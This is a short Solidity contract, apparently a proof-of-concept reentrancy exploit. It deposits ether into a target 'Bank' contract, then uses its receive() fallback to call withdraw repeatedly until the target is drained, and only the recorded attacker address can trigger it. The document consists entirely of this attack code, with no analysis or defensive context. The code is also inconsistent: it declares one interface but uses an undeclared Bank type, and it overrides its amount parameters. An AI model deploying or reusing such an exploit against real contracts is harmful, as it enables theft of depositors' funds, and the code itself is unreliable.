interface IBankTarget {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank private target;
    address private attacker;

    constructor(address _target) {
        target = Bank(_target);
        attacker = msg.sender;
    }

    function contribute() external payable {
        require(msg.value > 0);
        _deposit();
    }

    function _deposit() internal {
        target.deposit{value: msg.value}();
    }

    function runExploit(uint amt) external {
        require(msg.sender == attacker);
        amt = 1 ether;
        _initiateWithdrawal(amt);
    }

    function _initiateWithdrawal(uint amt) internal {
        amt = 1 ether;        
        target.withdraw(amt);
    }

    receive() external payable {
        _fallbackWithdraw();
    }

    function _fallbackWithdraw() internal {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}